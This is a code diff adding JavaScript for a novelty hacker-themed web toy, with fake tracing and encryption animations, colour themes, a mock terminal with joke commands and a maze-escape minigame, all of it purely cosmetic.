+      pct += 1 + Math.random()*5; if (pct >= 100) { pct = 100; clearInterval(iv1); }
+      bar.style.width = pct+'%'; label.textContent = Math.floor(pct)+'%';
+    }, 80);
+    const iv2 = setInterval(() => {
+      const file = dirs[ri(0,dirs.length-1)] + names[ri(0,names.length-1)] + '_' + ri(1,999) + exts[ri(0,exts.length-1)];
+      const size = (Math.random()*10).toFixed(1) + 'MB';
+      list.innerHTML += file + ' [' + size + ']<br>';
+      if (list.scrollHeight > list.clientHeight) list.scrollTop = list.scrollHeight;
+      while (list.childNodes.length > 200) list.removeChild(list.firstChild);
+    }, 40);
+    this.intervals.push(iv1, iv2);
+  },
+
+  animateTrace() {
+    const ipEl = document.getElementById('trace-ip-display');
+    const list = document.getElementById('trace-ip-list');
+    const canvas = document.getElementById('trace-graph-canvas');
+    const ctx = canvas.getContext('2d');
+    list.innerHTML = ''; ipEl.textContent = '0.0.0.0';
+    canvas.width = 300; canvas.height = 300;
+
+    // Graph traversal visualization
+    const nodes = [];
+    for (let i = 0; i < 12; i++) {
+      nodes.push({ x: 30 + Math.random()*240, y: 30 + Math.random()*240, label: `${ri(1,255)}.${ri(1,255)}.${ri(0,255)}.${ri(1,255)}` });
+    }
+    const edges = [];
+    for (let i = 1; i < nodes.length; i++) edges.push([ri(0, i-1), i]);
+    for (let i = 0; i < 4; i++) edges.push([ri(0, nodes.length-1), ri(0, nodes.length-1)]);
+
+    let activeEdge = 0, traceCount = 0;
+    const color = getComputedStyle(document.body).getPropertyValue('--color-primary').trim();
+
+    const iv1 = setInterval(() => {
+      const ip = `${ri(1,255)}.${ri(1,255)}.${ri(1,255)}.${ri(1,255)}`;
+      list.innerHTML += ip + ':' + ri(1,65535) + '<br>';
+      if (list.scrollHeight > list.clientHeight) list.scrollTop = list.scrollHeight;
+      while (list.childNodes.length > 200) list.removeChild(list.firstChild);
+    }, 50);
+
+    const iv2 = setInterval(() => {
+      ipEl.textContent = `${ri(1,255)}.${ri(1,255)}.${ri(1,255)}.${ri(1,255)}`;
+      traceCount++;
+      if (traceCount > 25) { clearInterval(iv2); ipEl.textContent = '173.194.222.101 [LOCKED]'; }
+    }, 80);
+
+    const iv3 = setInterval(() => {
+      ctx.clearRect(0, 0, 300, 300);
+      // Draw edges
+      edges.forEach(([a,b], idx) => {
+        ctx.beginPath(); ctx.moveTo(nodes[a].x, nodes[a].y); ctx.lineTo(nodes[b].x, nodes[b].y);
+        ctx.strokeStyle = idx < activeEdge ? color : color + '33';
+        ctx.lineWidth = idx < activeEdge ? 2 : 0.5;
+        ctx.stroke();
+      });
+      // Draw nodes
+      nodes.forEach((n, i) => {
+        ctx.beginPath(); ctx.arc(n.x, n.y, 5, 0, Math.PI*2);
+        ctx.fillStyle = i <= activeEdge ? color : color + '44';
+        ctx.fill();
+        ctx.fillStyle = color + '88'; ctx.font = '7px monospace';
+        ctx.fillText(n.label, n.x - 25, n.y + 14);
+      });
+      // Animate active edge pulse
+      if (activeEdge < edges.length) {
+        const [a,b] = edges[activeEdge];
+        const t = (Date.now() % 500) / 500;
+        const px = nodes[a].x + (nodes[b].x - nodes[a].x) * t;
+        const py = nodes[a].y + (nodes[b].y - nodes[a].y) * t;
+        ctx.beginPath(); ctx.arc(px, py, 4, 0, Math.PI*2);
+        ctx.fillStyle = '#ffffff'; ctx.fill();
+      }
+      if (Math.random() < 0.03 && activeEdge < edges.length) activeEdge++;
+    }, 33);
+    this.intervals.push(iv1, iv2, iv3);
+  },
+
+  animateEncrypt() {
+    const scramble = document.getElementById('encrypt-scramble');
+    const stream = document.getElementById('encrypt-stream');
+    stream.textContent = '';
+    const hexChars = '0123456789ABCDEF';
+    const iv1 = setInterval(() => {
+      let s = ''; for (let i = 0; i < 80; i++) s += hexChars[ri(0, 15)];
+      scramble.textContent = s;
+    }, 50);
+    const iv2 = setInterval(() => {
+      let line = '';
+      for (let i = 0; i < 120; i++) line += hexChars[ri(0,15)];
+      stream.textContent += line + '\n';
+      if (stream.textContent.length > 20000) stream.textContent = stream.textContent.slice(-10000);
+    }, 30);
+    setTimeout(() => { clearInterval(iv1); scramble.textContent = 'ENCRYPTION COMPLETE // AES-256-CBC'; }, 2800);
+    this.intervals.push(iv1, iv2);
+  },
+
+  animateFirewall() {
+    const canvas = document.getElementById('firewall-canvas');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+    const color = getComputedStyle(document.body).getPropertyValue('--color-primary').trim();
+
+    // Generate network nodes
+    const nodes = [];
+    const labels = ['PROXY-1','TOR-EXIT','VPN-NODE','RELAY-3','SOCKS5','BRIDGE','GATEWAY','TARGET','ORIGIN','MESH-7','DARKWEB','ONION-RT'];
+    for (let i = 0; i < 12; i++) {
+      nodes.push({
+        x: 100 + Math.random() * (canvas.width - 200),
+        y: 80 + Math.random() * (canvas.height - 160),
+        label: labels[i], active: false
+      });
+    }
+    const edges = [];
+    for (let i = 1; i < nodes.length; i++) edges.push([ri(0, i-1), i]);
+    for (let i = 0; i < 5; i++) edges.push([ri(0, nodes.length-1), ri(0, nodes.length-1)]);
+
+    let step = 0;
+    const iv = setInterval(() => {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      // Draw edges
+      edges.forEach(([a,b], idx) => {
+        ctx.beginPath(); ctx.moveTo(nodes[a].x, nodes[a].y); ctx.lineTo(nodes[b].x, nodes[b].y);
+        const isActive = idx <= step;
+        ctx.strokeStyle = isActive ? color : color + '22'; ctx.lineWidth = isActive ? 2 : 0.5;
+        ctx.stroke();
+        // Animated packet on active edge
+        if (idx === step) {
+          const t = (Date.now() % 600) / 600;
+          const px = nodes[a].x + (nodes[b].x - nodes[a].x) * t;
+          const py = nodes[a].y + (nodes[b].y - nodes[a].y) * t;
+          ctx.beginPath(); ctx.arc(px, py, 4, 0, Math.PI*2); ctx.fillStyle = '#fff'; ctx.fill();
+          ctx.beginPath(); ctx.arc(px, py, 8, 0, Math.PI*2); ctx.strokeStyle = color; ctx.lineWidth = 1; ctx.stroke();
+        }
+      });
+      // Draw nodes
+      nodes.forEach((n, i) => {
+        const isActive = i <= step;
+        ctx.beginPath(); ctx.arc(n.x, n.y, isActive ? 8 : 5, 0, Math.PI*2);
+        ctx.fillStyle = isActive ? color : color + '33'; ctx.fill();
+        if (isActive) { ctx.beginPath(); ctx.arc(n.x, n.y, 12, 0, Math.PI*2); ctx.strokeStyle = color + '66'; ctx.lineWidth = 1; ctx.stroke(); }
+        ctx.fillStyle = isActive ? '#fff' : color + '66'; ctx.font = (isActive ? 'bold ' : '') + '10px monospace'; ctx.textAlign = 'center';
+        ctx.fillText(n.label, n.x, n.y + 22);
+      });
+      if (Math.random() < 0.06 && step < edges.length) step++;
+    }, 33);
+    this.intervals.push(iv);
+  },
+
+  animateSatellite() {
+    const canvas = document.getElementById('satellite-canvas');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+    const label = document.getElementById('sat-label');
+    label.textContent = 'SELECT A SATELLITE TO CONNECT';
+    const color = getComputedStyle(document.body).getPropertyValue('--color-primary').trim();
+
+    // Earth in center
+    const cx = canvas.width / 2, cy = canvas.height / 2;
+    const earthR = 40;
+
+    // Satellites in orbits
+    const sats = [
+      {name:'SAT-ALPHA',orbit:120,angle:0,speed:0.008},
+      {name:'SAT-BRAVO',orbit:160,angle:Math.PI*0.7,speed:0.006},
+      {name:'SAT-CHARLIE',orbit:200,angle:Math.PI*1.3,speed:0.004},
+      {name:'SAT-DELTA',orbit:140,angle:Math.PI*0.3,speed:0.01},
+      {name:'SAT-ECHO',orbit:180,angle:Math.PI*1.8,speed:0.007},
+      {name:'DARKSTAR-1',orbit:240,angle:Math.PI*0.5,speed:0.003},
+    ];
+    let selected = -1, connected = false;
+
+    const drawFrame = () => {
+      if (!document.getElementById('overlay-satellite').classList.contains('active')) { return; }
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+      // Draw orbit rings
+      sats.forEach(s => {
+        ctx.beginPath(); ctx.arc(cx, cy, s.orbit, 0, Math.PI*2);
+        ctx.strokeStyle = color + '11'; ctx.lineWidth = 0.5; ctx.stroke();
+      });
+
+      // Earth
+      ctx.beginPath(); ctx.arc(cx, cy, earthR, 0, Math.PI*2);
+      ctx.fillStyle = color + '22'; ctx.fill();
+      ctx.strokeStyle = color + '66'; ctx.lineWidth = 1.5; ctx.stroke();
+      ctx.fillStyle = color; ctx.font = 'bold 10px monospace'; ctx.textAlign = 'center';
+      ctx.fillText('EARTH', cx, cy + 4);
+
+      // Satellites
+      sats.forEach((s, i) => {
+        s.angle += s.speed;
+        const sx = cx + s.orbit * Math.cos(s.angle);
+        const sy = cy + s.orbit * Math.sin(s.angle);
+        s.sx = sx; s.sy = sy;
+
+        // Connection beam
+        if (i === selected) {
+          ctx.beginPath(); ctx.moveTo(cx, cy); ctx.lineTo(sx, sy);
+          ctx.strokeStyle = connected ? color : color + '44';
+          ctx.lineWidth = connected ? 2 : 1;
+          ctx.setLineDash(connected ? [] : [4, 4]); ctx.stroke(); ctx.setLineDash([]);
+          // Pulse
+          if (connected) {
+            const t = (Date.now() % 800) / 800;
+            const px = cx + (sx-cx)*t, py = cy + (sy-cy)*t;
+            ctx.beginPath(); ctx.arc(px, py, 3, 0, Math.PI*2); ctx.fillStyle = '#fff'; ctx.fill();
+          }
+        }
+
+        // Sat body
+        const isSelected = i === selected;
+        ctx.beginPath(); ctx.arc(sx, sy, isSelected ? 10 : 7, 0, Math.PI*2);
+        ctx.fillStyle = isSelected ? color : color + '66'; ctx.fill();
+        if (isSelected) { ctx.beginPath(); ctx.arc(sx, sy, 14, 0, Math.PI*2); ctx.strokeStyle = color; ctx.lineWidth = 1; ctx.stroke(); }
+
+        // Label
+        ctx.fillStyle = isSelected ? '#fff' : color + '88'; ctx.font = (isSelected ? 'bold ' : '') + '9px monospace';
+        ctx.textAlign = 'center'; ctx.fillText(s.name, sx, sy - 14);
+        // Signal strength
+        ctx.fillText(ri(70,99) + 'dBm', sx, sy + 22);
+      });
+
+      requestAnimationFrame(drawFrame);
+    };
+    requestAnimationFrame(drawFrame);
+
+    // Click handler for satellite selection
+    const clickHandler = (e) => {
+      const rect = canvas.getBoundingClientRect();
+      const mx = e.clientX - rect.left, my = e.clientY - rect.top;
+      sats.forEach((s, i) => {
+        const dx = mx - s.sx, dy = my - s.sy;
+        if (dx*dx + dy*dy < 400) {
+          selected = i; connected = false;
+          label.textContent = 'CONNECTING TO ' + s.name + '...';
+          AudioEngine.playAlert();
+          setTimeout(() => {
+            connected = true;
+            label.textContent = s.name + ' // UPLINK ESTABLISHED // ' + ri(70,99) + 'dBm';
+            AudioEngine.playGranted();
+            // Auto-close after connection
+            setTimeout(() => {
+              const el = document.getElementById('overlay-satellite');
+              el.classList.add('exit');
+              canvas.removeEventListener('click', clickHandler);
+              setTimeout(() => { el.classList.remove('active','exit','interactive'); state.overlayActive = false; }, 400);
+            }, 2000);
+          }, 1500);
+        }
+      });
+    };
+    canvas.addEventListener('click', clickHandler);
+  }
+};
+
+// ===== GLITCH (F8 toggle) =====
+const Glitch = {
+  toggle() {
+    state.glitchOn = !state.glitchOn;
+    if (state.glitchOn) {
+      AudioEngine.playModem();
+      document.body.classList.add('glitch-active');
+      // Continuous chromatic aberration with random intensity changes
+      state.glitchTimer = setInterval(() => {
+        // Random intensity bursts
+        const r = ri(2,10), b = ri(2,10);
+        document.body.style.setProperty('--glitch-r', r+'px');
+        document.body.style.setProperty('--glitch-b', b+'px');
+        // Occasional modem burst
+        if (Math.random() < 0.15) AudioEngine.playModem();
+      }, 200);
+    } else {
+      document.body.classList.remove('glitch-active');
+      if (state.glitchTimer) clearInterval(state.glitchTimer);
+      state.glitchTimer = null;
+    }
+  }
+};
+
+// ===== THEMES =====
+const Themes = {
+  names: ['matrix','cyberpunk','military','redalert','darkcyber','synthwave','deepblack'],
+  labels: ['MATRIX','CYBERPUNK','MILITARY','RED ALERT','DARK CYBER','SYNTHWAVE','DEEP BLACK'],
+  set(name) { document.body.setAttribute('data-theme', name); state.theme = name; dom.themeLabel.textContent = this.labels[this.names.indexOf(name)] || name.toUpperCase(); }
+};
+
+function updateSpacer() {
+  const h = dom.codeOutputContainer.clientHeight;
+  document.getElementById('code-output-spacer').style.height = Math.floor(h * 0.2) + 'px';
+}
+
+function scrollCodeToBottom() {
+  dom.codeOutputContainer.scrollTop = dom.codeOutputContainer.scrollHeight;
+}
+
+function updateClock() { dom.clock.textContent = new Date().toISOString().substr(11, 12); }
+function toggleSettings() { state.settingsOpen = !state.settingsOpen; dom.settingsModal.classList.toggle('hidden', !state.settingsOpen); }
+
+// ===== TERMINAL COMMAND SYSTEM =====
+const Terminal = {
+  // Commands that print output and keep terminal open
+  outputCommands: ['help','h','ls','cd','pwd','whoami','cat','ping','ifconfig','uname','uptime','status','theme'],
+  open() {
+    state.terminalOpen = true;
+    state.terminalInput = '';
+    dom.terminalPopup.classList.remove('hidden');
+    dom.promptInput.textContent = '';
+  },
+  close() {
+    state.terminalOpen = false;
+    state.terminalInput = '';
+    dom.terminalPopup.classList.add('hidden');
+    dom.promptInput.textContent = '';
+  },
+  addChar(ch) {
+    state.terminalInput += ch;
+    dom.promptInput.textContent = state.terminalInput;
+  },
+  delChar() {
+    state.terminalInput = state.terminalInput.slice(0, -1);
+    dom.promptInput.textContent = state.terminalInput;
+  },
+  // Print a line to the popup's own output area
+  printLine(html, cls) {
+    const div = document.createElement('div');
+    div.className = cls || 'cmd-output';
+    div.innerHTML = html;
+    dom.terminalOutput.appendChild(div);
+    dom.terminalOutput.scrollTop = dom.terminalOutput.scrollHeight;
+  },
+  // Print to the main code-output (for effects that close the terminal)
+  printToMain(html, cls) {
+    const div = document.createElement('div');
+    div.className = cls || 'cmd-output';
+    div.innerHTML = html;
+    dom.codeOutput.appendChild(div);
+    scrollCodeToBottom();
+  },
+  printEcho(cmd) {
+    this.printLine('<span style="color:var(--color-keyword);font-weight:bold;">root@darknet:' + state.cwd + '#</span> ' + cmd, 'cmd-echo');
+  },
+  execute() {
+    const raw = state.terminalInput.trim();
+    this.printEcho(raw);
+    state.terminalInput = '';
+    dom.promptInput.textContent = '';
+    if (!raw) return;
+    const parts = raw.split(/\s+/);
+    const cmd = parts[0].toLowerCase();
+    const args = parts.slice(1);
+    const handler = COMMANDS[cmd];
+    if (handler) {
+      handler(args, raw);
+      // Keep terminal open for output commands, close for effect commands
+      if (!this.outputCommands.includes(cmd)) {
+        // effect commands close themselves via Terminal.close()
+      }
+    } else {
+      // Unknown command: cycle source + theme
+      this.printLine('<span class="cmd-error">command not found: ' + cmd + '</span>');
+      state.codeIndex = (state.codeIndex + 1) % CODE_SOURCES.length;
+      state.codePos = 0;
+      const rndTheme = Themes.names[ri(0, Themes.names.length - 1)];
+      Themes.set(rndTheme);
+      const langNames = ['C/Kernel','C/AES','C/Exploit','Python','Assembly','Rust','Go','JavaScript'];
+      this.printLine('<span class="cmd-highlight">[SYS] Switching to channel ' + state.codeIndex + '... ' + (langNames[state.codeIndex]||'UNKNOWN') + ' // Theme: ' + rndTheme.toUpperCase() + '</span>');
+      this.close();
+    }
+  }
+};
+
+// ===== JAILBREAK MAZE GAME =====
+const JailbreakGame = {
+  maze: null, cols: 15, rows: 11, cellSize: 0, canvas: null, ctx: null,
+  player: null, police: null, exit: null, popup: null,
+  policeTimer: null, animFrame: null, gameOver: false, keyHandler: null,
+
+  start() {
+    state.jailbreakActive = true;
+    this.gameOver = false;
+
+    // Create popup
+    const popup = document.createElement('div');
+    popup.id = 'jailbreak-popup';
+    popup.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:700px;height:500px;background:#0a0a0a;border:2px solid var(--color-primary);z-index:10000;display:flex;flex-direction:column;box-shadow:0 0 30px rgba(0,255,65,0.3);font-family:monospace;';
+    // Title bar
+    const titleBar = document.createElement('div');
+    titleBar.style.cssText = 'display:flex;justify-content:space-between;align-items:center;padding:6px 12px;background:rgba(255,255,255,0.05);border-bottom:1px solid var(--color-primary);flex-shrink:0;';
+    titleBar.innerHTML = '<span style="color:var(--color-primary);font-size:13px;font-weight:bold;">JAILBREAK PROTOCOL</span>';
+    const closeBtn = document.createElement('span');
+    closeBtn.textContent = 'X';
+    closeBtn.style.cssText = 'color:#ff4444;cursor:pointer;font-weight:bold;font-size:14px;';
+    closeBtn.onclick = () => this.close();
+    titleBar.appendChild(closeBtn);
+    popup.appendChild(titleBar);
+
+    // Canvas
+    const canvas = document.createElement('canvas');
+    canvas.style.cssText = 'flex:1;display:block;';
+    popup.appendChild(canvas);
+    document.body.appendChild(popup);
+    this.popup = popup;
+    this.canvas = canvas;
+    this.ctx = canvas.getContext('2d');
+
+    // Size canvas to fill popup body
+    const cw = 700;
+    const ch = 500 - 34; // subtract title bar
+    canvas.width = cw;
+    canvas.height = ch;
+    this.cellSize = Math.floor(Math.min(cw / this.cols, ch / this.rows));
+
+    // Generate maze
+    this._generateMaze();
+    this.player = { x: 0, y: 0 };
+    this.police = { x: this.cols - 1, y: this.rows - 1 };
+    this.exit = { x: this.cols - 1, y: this.rows - 1 };
+
+    // Input handler
+    this.keyHandler = (e) => {
+      if (this.gameOver) return;
+      if (e.key === 'Escape') { e.preventDefault(); this.close(); return; }
+      let dx = 0, dy = 0;
+      if (e.key === 'ArrowUp') dy = -1;
+      else if (e.key === 'ArrowDown') dy = 1;
+      else if (e.key === 'ArrowLeft') dx = -1;
+      else if (e.key === 'ArrowRight') dx = 1;
+      if (dx !== 0 || dy !== 0) {
+        e.preventDefault();
+        this._movePlayer(dx, dy);
+      }
+    };
+    document.addEventListener('keydown', this.keyHandler);
+
+    // Police movement timer
+    this.policeTimer = setInterval(() => {
+      if (!this.gameOver) this._movePolice();
+    }, 500);
+
+    // Start draw loop
+    this._draw();
+  },
+
+  close() {
+    state.jailbreakActive = false;
+    if (this.keyHandler) { document.removeEventListener('keydown', this.keyHandler); this.keyHandler = null; }
+    if (this.policeTimer) { clearInterval(this.policeTimer); this.policeTimer = null; }
+    if (this.animFrame) { cancelAnimationFrame(this.animFrame); this.animFrame = null; }
+    if (this.popup) { this.popup.remove(); this.popup = null; }
+  },
+
+  _generateMaze() {
+    // Initialize grid with all walls
+    this.maze = [];
+    for (let y = 0; y < this.rows; y++) {
+      this.maze[y] = [];
+      for (let x = 0; x < this.cols; x++) {
+        this.maze[y][x] = { top: true, right: true, bottom: true, left: true, visited: false };
+      }
+    }
+    // Recursive backtracker DFS
+    const stack = [];
+    const start = this.maze[0][0];
+    start.visited = true;
+    stack.push({ x: 0, y: 0 });
+    while (stack.length > 0) {
+      const cur = stack[stack.length - 1];
+      const neighbors = [];
+      const dirs = [
+        { dx: 0, dy: -1, wall: 'top', opp: 'bottom' },
+        { dx: 1, dy: 0, wall: 'right', opp: 'left' },
+        { dx: 0, dy: 1, wall: 'bottom', opp: 'top' },
+        { dx: -1, dy: 0, wall: 'left', opp: 'right' }
+      ];
+      for (const d of dirs) {
+        const nx = cur.x + d.dx, ny = cur.y + d.dy;
+        if (nx >= 0 && nx < this.cols && ny >= 0 && ny < this.rows && !this.maze[ny][nx].visited) {
+          neighbors.push({ x: nx, y: ny, wall: d.wall, opp: d.opp });
+        }
+      }
+      if (neighbors.length > 0) {
+        const next = neighbors[ri(0, neighbors.length - 1)];
+        this.maze[cur.y][cur.x][next.wall] = false;
+        this.maze[next.y][next.x][next.opp] = false;
+        this.maze[next.y][next.x].visited = true;
+        stack.push({ x: next.x, y: next.y });
+      } else {
+        stack.pop();
+      }
+    }
+  },
+
+  _movePlayer(dx, dy) {
+    const { x, y } = this.player;
+    const cell = this.maze[y][x];
+    // Check wall in movement direction
+    if (dx === 1 && cell.right) return;
+    if (dx === -1 && cell.left) return;
+    if (dy === 1 && cell.bottom) return;
+    if (dy === -1 && cell.top) return;
+    const nx = x + dx, ny = y + dy;
+    if (nx < 0 || nx >= this.cols || ny < 0 || ny >= this.rows) return;
+    this.player.x = nx;
+    this.player.y = ny;
+    // Check win
+    if (nx === this.exit.x && ny === this.exit.y) this._gameOver(true);
+    // Check collision with police
+    else if (nx === this.police.x && ny === this.police.y) this._gameOver(false);
+  },
+
+  _hasLineOfSight() {
+    const px = this.police.x, py = this.police.y;
+    const hx = this.player.x, hy = this.player.y;
+    // Same row — check horizontal corridor
+    if (py === hy) {
+      const minX = Math.min(px, hx), maxX = Math.max(px, hx);
+      const dir = px < hx ? 'right' : 'left';
+      for (let x = minX; x < maxX; x++) {
+        if (this.maze[py][x].right) return false; // wall blocks
+      }
+      return true;
+    }
+    // Same column — check vertical corridor
+    if (px === hx) {
+      const minY = Math.min(py, hy), maxY = Math.max(py, hy);
+      for (let y = minY; y < maxY; y++) {
+        if (this.maze[y][px].bottom) return false;
+      }
+      return true;
+    }
+    return false;
+  },
+
+  _bfsStep() {
+    // BFS from police to player, returns next step {x,y} or null
+    const visited = [];
+    for (let y = 0; y < this.rows; y++) { visited[y] = []; for (let x = 0; x < this.cols; x++) visited[y][x] = false; }
+    const parent = [];
+    for (let y = 0; y < this.rows; y++) { parent[y] = []; for (let x = 0; x < this.cols; x++) parent[y][x] = null; }
+    const queue = [{ x: this.police.x, y: this.police.y }];
+    visited[this.police.y][this.police.x] = true;
+    const dirs = [
+      { dx: 0, dy: -1, wall: 'top' },
+      { dx: 1, dy: 0, wall: 'right' },
+      { dx: 0, dy: 1, wall: 'bottom' },
+      { dx: -1, dy: 0, wall: 'left' }
+    ];
+    let found = false;
+    while (queue.length > 0 && !found) {
+      const cur = queue.shift();
+      if (cur.x === this.player.x && cur.y === this.player.y) { found = true; break; }
+      for (const d of dirs) {
+        const nx = cur.x + d.dx, ny = cur.y + d.dy;
+        if (nx >= 0 && nx < this.cols && ny >= 0 && ny < this.rows && !visited[ny][nx] && !this.maze[cur.y][cur.x][d.wall]) {
+          visited[ny][nx] = true;
+          parent[ny][nx] = { x: cur.x, y: cur.y };
+          queue.push({ x: nx, y: ny });
+        }
+      }
+    }
+    if (found) {
+      let cx = this.player.x, cy = this.player.y;
+      while (parent[cy][cx]) {
+        const p = parent[cy][cx];
+        if (p.x === this.police.x && p.y === this.police.y) break;
+        cx = p.x; cy = p.y;
+      }
+      return { x: cx, y: cy };
+    }
+    return null;
+  },
+
+  _randomStep() {
+    // Pick a random open neighbor
+    const dirs = [
+      { dx: 0, dy: -1, wall: 'top' },
+      { dx: 1, dy: 0, wall: 'right' },
+      { dx: 0, dy: 1, wall: 'bottom' },
+      { dx: -1, dy: 0, wall: 'left' }
+    ];
+    const open = [];
+    for (const d of dirs) {
+      const nx = this.police.x + d.dx, ny = this.police.y + d.dy;
+      if (nx >= 0 && nx < this.cols && ny >= 0 && ny < this.rows && !this.maze[this.police.y][this.police.x][d.wall]) {
+        open.push({ x: nx, y: ny });
+      }
+    }
+    return open.length > 0 ? open[ri(0, open.length - 1)] : null;
+  },
+
+  _movePolice() {
+    let next;
+    if (this._hasLineOfSight()) {
+      // Line of sight: always pursue
+      next = this._bfsStep();
+    } else if (Math.random() < 0.5) {
+      // 50%: pursue via BFS
+      next = this._bfsStep();
+    } else {
+      // 50%: wander randomly
+      next = this._randomStep();
+    }
+    if (next) {
+      this.police.x = next.x;
+      this.police.y = next.y;
+    }
+    if (this.police.x === this.player.x && this.police.y === this.player.y) this._gameOver(false);
+  },
+
+  _draw() {
+    if (!this.ctx || !this.popup) return;
+    const ctx = this.ctx;
+    const cs = this.cellSize;
+    const w = this.canvas.width, h = this.canvas.height;
+    const offsetX = Math.floor((w - this.cols * cs) / 2);
+    const offsetY = Math.floor((h - this.rows * cs) / 2);
+
+    ctx.fillStyle = '#0a0a0a';
+    ctx.fillRect(0, 0, w, h);
+
+    const primary = getComputedStyle(document.body).getPropertyValue('--color-primary').trim() || '#00ff41';
+
+    // Draw cells and walls
+    for (let y = 0; y < this.rows; y++) {
+      for (let x = 0; x < this.cols; x++) {
+        const cell = this.maze[y][x];
+        const px = offsetX + x * cs, py = offsetY + y * cs;
+
+        // Cell floor
+        ctx.fillStyle = '#111';
+        ctx.fillRect(px + 1, py + 1, cs - 2, cs - 2);
+
+        // Walls
+        ctx.strokeStyle = primary;
+        ctx.globalAlpha = 0.5;
+        ctx.lineWidth = 2;
+        ctx.beginPath();
+        if (cell.top) { ctx.moveTo(px, py); ctx.lineTo(px + cs, py); }
+        if (cell.right) { ctx.moveTo(px + cs, py); ctx.lineTo(px + cs, py + cs); }
+        if (cell.bottom) { ctx.moveTo(px, py + cs); ctx.lineTo(px + cs, py + cs); }
+        if (cell.left) { ctx.moveTo(px, py); ctx.lineTo(px, py + cs); }
+        ctx.stroke();
+        ctx.globalAlpha = 1;
+      }
+    }
+
+    // Draw exit
+    ctx.fillStyle = '#ffcc00';
+    ctx.fillRect(offsetX + this.exit.x * cs + 3, offsetY + this.exit.y * cs + 3, cs - 6, cs - 6);
+    ctx.fillStyle = '#0a0a0a';
+    ctx.font = 'bold ' + Math.floor(cs * 0.5) + 'px monospace';
+    ctx.textAlign = 'center';
+    ctx.textBaseline = 'middle';
+    ctx.fillText('EXIT', offsetX + this.exit.x * cs + cs / 2, offsetY + this.exit.y * cs + cs / 2);
+
+    // Draw player
+    ctx.fillStyle = '#00ff41';
+    ctx.beginPath();
+    ctx.arc(offsetX + this.player.x * cs + cs / 2, offsetY + this.player.y * cs + cs / 2, cs / 3, 0, Math.PI * 2);
+    ctx.fill();
+    ctx.fillStyle = '#003300';
+    ctx.font = 'bold ' + Math.floor(cs * 0.45) + 'px monospace';
+    ctx.fillText('@', offsetX + this.player.x * cs + cs / 2, offsetY + this.player.y * cs + cs / 2 + 1);
+
+    // Draw police
+    ctx.fillStyle = '#ff2222';
+    ctx.beginPath();
+    ctx.arc(offsetX + this.police.x * cs + cs / 2, offsetY + this.police.y * cs + cs / 2, cs / 3, 0, Math.PI * 2);
+    ctx.fill();
+    ctx.fillStyle = '#440000';
+    ctx.font = 'bold ' + Math.floor(cs * 0.45) + 'px monospace';
+    ctx.fillText('P', offsetX + this.police.x * cs + cs / 2, offsetY + this.police.y * cs + cs / 2 + 1);
+
+    // Game over message
+    if (this.gameOver) return;
+    this.animFrame = requestAnimationFrame(() => this._draw());
+  },
+
+  _gameOver(won) {
+    this.gameOver = true;
+    if (this.policeTimer) { clearInterval(this.policeTimer); this.policeTimer = null; }
+
+    const ctx = this.ctx;
+    const w = this.canvas.width, h = this.canvas.height;
+
+    // Draw final frame then overlay message
+    ctx.fillStyle = 'rgba(0,0,0,0.7)';
+    ctx.fillRect(0, 0, w, h);
+    ctx.textAlign = 'center';
+    ctx.textBaseline = 'middle';
+    if (won) {
+      ctx.fillStyle = '#00ff41';
+      ctx.font = 'bold 36px monospace';
+      ctx.fillText('JAILBREAK SUCCESSFUL', w / 2, h / 2);
+      AudioEngine.playGranted();
+      Particles.emit(window.innerWidth / 2, window.innerHeight / 2, 80, '#00ff41', 8, 50);
+    } else {
+      ctx.fillStyle = '#ff2222';
+      ctx.font = 'bold 36px monospace';
+      ctx.fillText('CAPTURED', w / 2, h / 2);
+      AudioEngine.playDenied();
+      Particles.emit(window.innerWidth / 2, window.innerHeight / 2, 80, '#ff2222', 8, 50);
+    }
+    setTimeout(() => this.close(), 2000);
+  }
+};
+
+const COMMANDS = {
+  // === OUTPUT COMMANDS (print to terminal, prompt stays open or closes) ===
+  help(args) {
+    Terminal.printLine('<span class="cmd-highlight">HACKTERM v3.1 // COMMAND REFERENCE</span>');
+    Terminal.printLine('');
+    Terminal.printLine('<span class="cmd-highlight">EFFECTS:</span>  nuke  hack  launch  decrypt  rickroll  matrix  panic  ddos  sudo  pizza  jailbreak  exit');
+    Terminal.printLine('<span class="cmd-highlight">SYSTEM:</span>  ls  cd  pwd  whoami  cat  rm  ping  ifconfig  uname  uptime  clear  status');
+    Terminal.printLine('<span class="cmd-highlight">CONFIG:</span>  theme &lt;name&gt;  (matrix|cyberpunk|military|redalert|darkcyber|synthwave|deepblack)');
+    Terminal.printLine('');
+    Terminal.printLine('Unknown commands switch to a random code channel + theme.');
+  },
+  h(a) { COMMANDS.help(a); },
+
+  ls() {
+    const dirs = ['<span class="cmd-highlight">exploit/</span>','<span class="cmd-highlight">tools/</span>','<span class="cmd-highlight">keys/</span>','<span class="cmd-highlight">logs/</span>','<span class="cmd-highlight">network/</span>'];
+    const files = ['.bashrc','.ssh/'];
+    Terminal.printLine(dirs.join('  ') + '  ' + files.join('  '));
+  },
+
+  cd(args) {
+    const dir = args[0] || '/root';
+    const valid = ['exploit','tools','keys','logs','network','~','/root','/','..'];
+    if (valid.includes(dir) || dir.startsWith('/')) {
+      state.cwd = dir === '~' || dir === '/root' ? '/root' : dir === '..' ? '/root' : '/root/' + dir.replace(/^\/root\/?/,'');
+      Terminal.printLine('Changed directory to ' + state.cwd);
+    } else {
+      Terminal.printLine('<span class="cmd-error">No such directory: ' + dir + '</span>');
+    }
+  },
+
+  pwd() { Terminal.printLine(state.cwd); },
+  whoami() { Terminal.printLine('<span class="cmd-success">root</span>'); },
+
+  cat(args) {
+    const f = (args[0] || '').toLowerCase();
+    const fakeFiles = {
+      '.bashrc': 'export PATH=$PATH:/opt/exploits\nalias hack="python3 /root/exploit/main.py"\nalias scan="nmap -sV -T4"',
+      'payload.c': '#include <stdio.h>\n// CLASSIFIED - LEVEL 5 CLEARANCE REQUIRED\nunsigned char shellcode[] = "\\x48\\x31\\xc0\\x48\\x89\\xc2...";',
+      'config.enc': 'U2FsdGVkX1+vJ8Y7z9qK3Xm4B0wR5nH2\naGFja2VydHlwZXIuY29t\nY29uZmlnOnRvcHNlY3JldA==',
